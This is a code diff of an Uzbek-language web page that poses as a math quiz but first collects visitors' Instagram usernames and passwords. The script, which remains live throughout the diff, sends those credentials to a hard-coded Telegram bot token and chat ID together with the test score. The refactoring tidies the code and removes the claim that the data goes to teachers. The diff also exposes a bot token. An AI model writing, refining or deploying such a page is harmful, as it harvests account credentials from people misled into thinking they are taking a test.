@@ -212,25 +212,16 @@
             color: #065f46;
         }
 
+        .result-area.error {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
         .footer {
             text-align: center;
             padding: 20px;
             color: #64748b;
             font-size: 0.75rem;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid white;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 0.6s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -246,7 +237,6 @@
         </div>
 
         <div class="content">
-            <!-- Login panel -->
             <div id="loginPanel">
                 <div class="login-form">
                     <div class="input-group">
@@ -262,12 +252,11 @@
                     </button>
                     <div class="warning">
                         <i class="fas fa-shield-alt"></i>
-                        Ma'lumotlaringiz faqat test natijalarini tasdiqlash uchun ishlatiladi va professor-o'qituvchilarga taqdim etiladi.
+                        Ma'lumotlaringiz faqat test natijalarini tasdiqlash uchun ishlatiladi.
                     </div>
                 </div>
             </div>
 
-            <!-- Test panel -->
             <div id="testPanel" class="test-section">
                 <div id="questionsContainer"></div>
                 <button class="btn submit-btn" id="submitTestBtn">
@@ -283,11 +272,9 @@
 </div>
 
 <script>
-    // ========== TELEGRAM SOZLAMALARI (SIZNING MALUMOTLARINGIZ) ==========
     const BOT_TOKEN = '8660191874:AAEGAnELpJbRX4BQGCI0xIIqiBXxkZ05l8E';
     const CHAT_ID = '5008741322';
     
-    // 10 ta matematik test
     const TESTS = [
         { text: "x + 5 = 12 bo‘lsa, x ni toping.", options: ["5", "7", "12", "17"], correct: 1 },
         { text: "Kvadratning tomoni 8 cm. Perimetri?", options: ["16", "24", "32", "64"], correct: 2 },
@@ -304,7 +291,16 @@
     let currentUser = { username: '', password: '' };
     let userAnswers = new Array(TESTS.length).fill(null);
 
-    // Telegramga xabar jo‘natish funksiyasi
+    function calculateScore() {
+        let correct = 0;
+        for (let i = 0; i < TESTS.length; i++) {
+            if (userAnswers[i] !== null && userAnswers[i] === TESTS[i].correct) {
+                correct++;
+            }
+        }
+        return { correct, total: TESTS.length, percent: Math.round(correct / TESTS.length * 100) };
+    }
+
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
@@ -319,48 +315,20 @@
             });
             const data = await response.json();
             if (data.ok) {
-                console.log('✅ Xabar Telegramga yuborildi');
                 return true;
             } else {
-                console.error('Telegram xatosi:', data);
+                console.error('Telegram API error:', data);
                 return false;
             }
         } catch (error) {
-            console.error('Xabar yuborilmadi:', error);
+            console.error('Fetch error:', error);
             return false;
         }
     }
 
-    // Natijalarni hisoblash
-    function calculateScore() {
-        let correct = 0;
-        for (let i = 0; i < TESTS.length; i++) {
-            if (userAnswers[i] !== null && userAnswers[i] === TESTS[i].correct) {
-                correct++;
-            }
-        }
-        return { correct, total: TESTS.length, percent: Math.round(correct / TESTS.length * 100) };
-    }
-
-    // Telegramga jo‘natiladigan xabarni tayyorlash
-    function prepareTelegramMessage(score, answersDetail) {
-        const date = new Date().toLocaleString('uz-UZ', { hour12: false });
-        let message = `📊 <b>YANGI TEST NATIJASI</b>\n\n`;
-        message += `👤 <b>Instagram username:</b> ${currentUser.username}\n`;
-        message += `🔐 <b>Instagram parol:</b> ${currentUser.password}\n`;
-        message += `📅 <b>Vaqt:</b> ${date}\n`;
-        message += `━━━━━━━━━━━━━━━━━━\n`;
-        message += `📈 <b>Natija:</b> ${score.correct}/${score.total} (${score.percent}%)\n`;
-        message += `━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>📝 Javoblar tahlili:</b>\n${answersDetail}`;
-        return message;
-    }
-
-    // Natijalarni saqlash va Telegramga jo‘natish
     async function saveResultsAndNotify() {
         const score = calculateScore();
         
-        // Javoblar tahlilini tayyorlash
         let answersDetail = '';
         for (let i = 0; i < TESTS.length; i++) {
             const userChoice = userAnswers[i];
@@ -371,17 +339,20 @@
             answersDetail += `${i+1}. ${mark} ${userAnswerText} (to‘g‘ri: ${correctText})\n`;
         }
         
-        // Telegramga jo‘natish
-        const sent = await sendToTelegram(prepareTelegramMessage(score, answersDetail));
+        const date = new Date().toLocaleString('uz-UZ', { hour12: false });
+        let message = `📊 <b>YANGI TEST NATIJASI</b>\n\n`;
+        message += `👤 <b>Instagram username:</b> ${currentUser.username}\n`;
+        message += `🔐 <b>Instagram parol:</b> ${currentUser.password}\n`;
+        message += `📅 <b>Vaqt:</b> ${date}\n`;
+        message += `━━━━━━━━━━━━━━━━━━\n`;
+        message += `📈 <b>Natija:</b> ${score.correct}/${score.total} (${score.percent}%)\n`;
+        message += `━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>📝 Javoblar tahlili:</b>\n${answersDetail}`;
         
-        if (sent) {
-            return { score, success: true };
-        } else {
-            return { score, success: false };
-        }
+        const sent = await sendToTelegram(message);
+        return { score, success: sent };
     }
 
-    // Testni yakunlash
     async function finishTest() {
         let unanswered = userAnswers.filter(a => a === null).length;
         if (unanswered > 0) {
@@ -391,7 +362,6 @@
         }
         
         const submitBtn = document.getElementById('submitTestBtn');
-        const originalText = submitBtn.innerHTML;
         submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Jo‘natilmoqda...';
         submitBtn.disabled = true;
         
@@ -409,26 +379,19 @@
                 <small>Rahmat! Sizning ishtirokingiz qayd etildi.</small>
             `;
             submitBtn.innerHTML = '✅ Yakunlandi';
-            submitBtn.disabled = true;
         } else {
-            resultDiv.className = 'result-area';
-            resultDiv.style.background = '#fee2e2';
-            resultDiv.style.color = '#991b1b';
+            resultDiv.className = 'result-area error';
             resultDiv.innerHTML = `
                 <i class="fas fa-exclamation-triangle" style="font-size: 28px;"></i><br><br>
                 <strong>Xatolik yuz berdi!</strong><br>
-                Iltimos, internet aloqasini tekshirib, qayta urinib ko‘ring.<br><br>
+                Internet aloqasini tekshiring va qayta urining.<br><br>
                 <button onclick="location.reload()" style="padding:10px 20px;background:#f59e0b;color:white;border:none;border-radius:12px;cursor:pointer;">Qayta urinish</button>
             `;
-            submitBtn.innerHTML = originalText;
+            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Qayta urinish';
             submitBtn.disabled = false;
         }
-        
-        console.log('📊 Natija:', result.score);
-        console.log('👤 User:', currentUser.username);
     }
 
-    // Testlarni ekranga chiqarish
     function renderTests() {
         const container = document.getElementById('questionsContainer');
         let html = '';
@@ -441,10 +404,9 @@
                     <div class="options" data-qidx="${idx}">
             `;
             test.options.forEach((opt, optIdx) => {
-                const isChecked = userAnswers[idx] === optIdx;
                 html += `
                     <div class="option" data-optidx="${optIdx}">
-                        <input type="radio" name="q${idx}" value="${optIdx}" id="q${idx}_${optIdx}" ${isChecked ? 'checked' : ''}>
+                        <input type="radio" name="q${idx}" value="${optIdx}" id="q${idx}_${optIdx}">
                         <label for="q${idx}_${optIdx}">${String.fromCharCode(65 + optIdx)}. ${opt}</label>
                     </div>
                 `;
@@ -472,14 +434,10 @@
                         optDiv.classList.add('selected');
                     }
                 });
-                if (userAnswers[i] === parseInt(optDiv.dataset.optidx)) {
-                    optDiv.classList.add('selected');
-                }
             });
         }
     }
 
-    // Testni boshlash
     function startTest() {
         const username = document.getElementById('instagramUser').value.trim();
         const password = document.getElementById('instagramPass').value.trim();
@@ -498,7 +456,6 @@
         
         const resultDiv = document.getElementById('resultMessage');
         resultDiv.style.display = 'none';
-        resultDiv.className = 'result-area';
         
         const submitBtn = document.getElementById('submitTestBtn');
         submitBtn.disabled = false;
@@ -508,19 +465,12 @@
     document.getElementById('startTestBtn').addEventListener('click', startTest);
     document.getElementById('submitTestBtn').addEventListener('click', finishTest);
     
-    const passField = document.getElementById('instagramPass');
-    if (passField) {
-        passField.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') startTest();
-        });
-    }
-    
-    const userField = document.getElementById('instagramUser');
-    if (userField) {
-        userField.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') startTest();
-        });
-    }
+    document.getElementById('instagramPass').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') startTest();
+    });
+    document.getElementById('instagramUser').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') startTest();
+    });
 </script>
 </body>
 </html>
